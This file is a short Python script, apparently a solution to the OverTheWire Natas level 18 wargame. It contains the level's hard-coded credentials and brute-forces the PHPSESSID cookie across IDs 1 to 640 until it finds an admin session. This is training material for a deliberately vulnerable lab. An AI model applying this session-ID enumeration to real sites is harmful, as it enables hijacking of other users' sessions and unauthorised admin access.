# Name: Michael Krakovsky
# Date: April 22, 2019
# Description: Create a script to break the code on natas18.
# Version: 1.0

from requests import Session
import pyperclip
import re

username = "natas18"
passwd = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
url = "http://natas18.natas.labs.overthewire.org/"

session = Session()

for i in range(1, 641):             # Loop through every session to find the admin password
    getResponse = session.get(url, cookies={"PHPSESSID": str(i)}, auth=(username, passwd))
    if ("You are an admin" in getResponse.text):
        print(getResponse.text)
        break

pyperclip.copy(getResponse.text)
#response = session.post(url, data = {"username": "one", "password": "gggg"}, auth=(username, passwd))
